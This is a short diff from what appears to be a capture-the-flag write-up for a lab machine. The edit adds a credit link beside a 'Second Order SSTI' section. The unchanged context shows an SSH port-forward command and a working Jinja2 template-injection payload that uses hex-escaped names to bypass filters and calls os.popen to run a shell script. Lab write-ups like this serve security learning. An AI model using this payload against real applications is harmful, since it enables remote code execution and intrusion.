@@ -273,7 +273,7 @@ ssh -L 5000:127.0.0.1:5000 smokey@second.thm
 
 ## RCE & Lateral Movement: Second Order SSTI
 
-> Payload
+> Payload: (Refer to [this](https://0day.work/jinja2-template-injection-filter-bypasses/) link which helped me coming up with the bypass!) 
 
 `{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('/tmp/shell.sh')|attr('read')()}}`
 
